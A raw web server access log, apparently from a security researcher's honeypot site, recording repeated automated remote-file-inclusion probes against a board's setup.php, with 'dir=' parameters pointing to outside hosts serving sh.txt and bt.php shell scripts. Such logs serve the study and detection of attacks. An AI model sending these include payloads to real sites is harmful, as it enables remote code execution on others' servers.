1.224.163.80 - - [15/Feb/2015:08:01:53 -0800] "POST ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [15/Feb/2015:08:01:53 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [15/Feb/2015:08:01:54 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [15/Feb/2015:08:02:02 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
112.218.68.155 - - [15/Feb/2015:08:02:04 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
112.218.68.155 - - [15/Feb/2015:08:02:05 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
112.218.68.155 - - [15/Feb/2015:08:02:06 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
71.6.150.241 - - [15/Feb/2015:08:02:14 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [15/Feb/2015:08:02:16 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [15/Feb/2015:08:02:16 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [15/Feb/2015:08:02:17 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
104.131.217.194 - - [15/Feb/2015:08:03:43 -0800] "GET /robots.txt HTTP/1.1" 301 465 "-" "Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )" 
104.131.217.194 - - [15/Feb/2015:08:03:43 -0800] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )" 
180.179.212.185 - - [15/Feb/2015:08:03:47 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
104.131.217.194 - - [15/Feb/2015:08:03:48 -0800] "GET / HTTP/1.1" 200 6751 "-" "Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )" 
104.131.217.194 - - [15/Feb/2015:08:03:49 -0800] "GET / HTTP/1.1" 301 446 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )" 
180.179.212.185 - - [15/Feb/2015:08:03:52 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
180.179.212.185 - - [15/Feb/2015:08:03:53 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
104.131.217.194 - - [15/Feb/2015:08:03:53 -0800] "GET /data HTTP/1.1" 404 303 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )" 
180.179.212.185 - - [15/Feb/2015:08:03:55 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
104.131.217.194 - - [15/Feb/2015:08:03:59 -0800] "GET /self.logs/ HTTP/1.1" 200 1097 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )" 
104.131.217.194 - - [15/Feb/2015:08:04:03 -0800] "GET /self.logs/?C=N;O=D HTTP/1.1" 200 1130 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )" 
104.131.217.194 - - [15/Feb/2015:08:04:08 -0800] "GET /self.logs/?C=S;O=A HTTP/1.1" 200 1159 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )" 
104.131.217.194 - - [15/Feb/2015:08:04:13 -0800] "GET /self.logs/?C=D;O=A HTTP/1.1" 200 1097 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )" 
104.131.217.194 - - [15/Feb/2015:08:04:18 -0800] "GET /self.logs/?C=M;O=A HTTP/1.1" 200 1107 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )" 
104.131.217.194 - - [15/Feb/2015:08:04:23 -0800] "GET /self.logs/?C=N;O=A HTTP/1.1" 200 1097 "http://www.secrepo.com/self.logs/?C=N;O=D" "Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )" 
91.121.6.123 - - [15/Feb/2015:08:04:27 -0800] "GET ////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
104.131.217.194 - - [15/Feb/2015:08:04:28 -0800] "GET /self.logs/?C=S;O=D HTTP/1.1" 200 1128 "http://www.secrepo.com/self.logs/?C=S;O=A" "Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )" 
91.121.6.123 - - [15/Feb/2015:08:04:28 -0800] "GET ////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
91.121.6.123 - - [15/Feb/2015:08:04:29 -0800] "POST ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
91.121.6.123 - - [15/Feb/2015:08:04:29 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
91.121.6.123 - - [15/Feb/2015:08:04:30 -0800] "POST ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
91.121.6.123 - - [15/Feb/2015:08:04:30 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
91.121.6.123 - - [15/Feb/2015:08:04:30 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
91.121.6.123 - - [15/Feb/2015:08:04:31 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
104.131.217.194 - - [15/Feb/2015:08:04:33 -0800] "GET /self.logs/?C=D;O=D HTTP/1.1" 200 1130 "http://www.secrepo.com/self.logs/?C=D;O=A" "Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )" 
104.131.217.194 - - [15/Feb/2015:08:04:38 -0800] "GET /self.logs/?C=M;O=D HTTP/1.1" 200 1118 "http://www.secrepo.com/self.logs/?C=M;O=A" "Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )" 
104.131.217.194 - - [15/Feb/2015:08:04:43 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 605900 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )" 
91.121.6.123 - - [15/Feb/2015:08:04:52 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [15/Feb/2015:08:04:53 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [15/Feb/2015:08:04:53 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [15/Feb/2015:08:04:54 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [15/Feb/2015:08:04:54 -0800] "GET ////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [15/Feb/2015:08:04:55 -0800] "GET ////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [15/Feb/2015:08:04:56 -0800] "POST ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [15/Feb/2015:08:04:57 -0800] "POST ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [15/Feb/2015:08:05:10 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [15/Feb/2015:08:05:12 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [15/Feb/2015:08:05:12 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [15/Feb/2015:08:05:13 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [15/Feb/2015:08:06:03 -0800] "GET ////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [15/Feb/2015:08:06:04 -0800] "GET ////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [15/Feb/2015:08:06:04 -0800] "POST ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [15/Feb/2015:08:06:05 -0800] "POST ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [15/Feb/2015:08:07:00 -0800] "GET ////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1" 
123.125.71.105 - - [15/Feb/2015:08:07:00 -0800] "GET / HTTP/1.1" 200 17520 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
91.121.6.123 - - [15/Feb/2015:08:07:01 -0800] "GET ////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1" 
91.121.6.123 - - [15/Feb/2015:08:07:01 -0800] "POST ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1" 
91.121.6.123 - - [15/Feb/2015:08:07:03 -0800] "POST ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1" 
176.31.252.38 - - [15/Feb/2015:08:07:16 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
176.31.252.38 - - [15/Feb/2015:08:07:17 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
176.31.252.38 - - [15/Feb/2015:08:07:17 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
176.31.252.38 - - [15/Feb/2015:08:07:19 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
220.181.108.146 - - [15/Feb/2015:08:07:24 -0800] "GET / HTTP/1.1" 200 17520 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
1.224.163.80 - - [15/Feb/2015:08:08:14 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
1.224.163.80 - - [15/Feb/2015:08:08:15 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
1.224.163.80 - - [15/Feb/2015:08:08:16 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
1.224.163.80 - - [15/Feb/2015:08:08:17 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
1.224.163.80 - - [15/Feb/2015:08:08:57 -0800] "GET ////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
1.224.163.80 - - [15/Feb/2015:08:08:58 -0800] "GET ////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
1.224.163.80 - - [15/Feb/2015:08:08:59 -0800] "POST ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
1.224.163.80 - - [15/Feb/2015:08:09:00 -0800] "POST ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
1.224.163.80 - - [15/Feb/2015:08:09:04 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
1.224.163.80 - - [15/Feb/2015:08:09:04 -0800] "GET ////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
1.224.163.80 - - [15/Feb/2015:08:09:06 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
1.224.163.80 - - [15/Feb/2015:08:09:06 -0800] "GET ////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
1.224.163.80 - - [15/Feb/2015:08:09:06 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
1.224.163.80 - - [15/Feb/2015:08:09:06 -0800] "POST ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
1.224.163.80 - - [15/Feb/2015:08:09:08 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
1.224.163.80 - - [15/Feb/2015:08:09:08 -0800] "POST ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
91.121.6.123 - - [15/Feb/2015:08:09:55 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [15/Feb/2015:08:09:56 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [15/Feb/2015:08:09:56 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [15/Feb/2015:08:09:57 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
71.6.150.241 - - [15/Feb/2015:08:15:35 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007" 
71.6.150.241 - - [15/Feb/2015:08:15:36 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007" 
71.6.150.241 - - [15/Feb/2015:08:15:37 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007" 
71.6.150.241 - - [15/Feb/2015:08:15:38 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007" 
71.6.150.241 - - [15/Feb/2015:08:15:51 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007" 
71.6.150.241 - - [15/Feb/2015:08:15:53 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007" 
71.6.150.241 - - [15/Feb/2015:08:15:53 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007" 
71.6.150.241 - - [15/Feb/2015:08:15:54 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007" 
176.31.252.38 - - [15/Feb/2015:08:16:32 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
176.31.252.38 - - [15/Feb/2015:08:16:34 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
176.31.252.38 - - [15/Feb/2015:08:16:34 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
176.31.252.38 - - [15/Feb/2015:08:16:35 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
181.65.186.35 - - [15/Feb/2015:08:21:11 -0800] "GET /honeypot////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [15/Feb/2015:08:21:12 -0800] "GET /honeypot////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [15/Feb/2015:08:21:12 -0800] "POST /honeypot////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [15/Feb/2015:08:21:13 -0800] "POST /honeypot////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [15/Feb/2015:08:21:14 -0800] "GET ////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [15/Feb/2015:08:21:15 -0800] "GET ////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [15/Feb/2015:08:21:15 -0800] "POST ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [15/Feb/2015:08:21:16 -0800] "POST ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
1.224.163.80 - - [15/Feb/2015:08:21:26 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
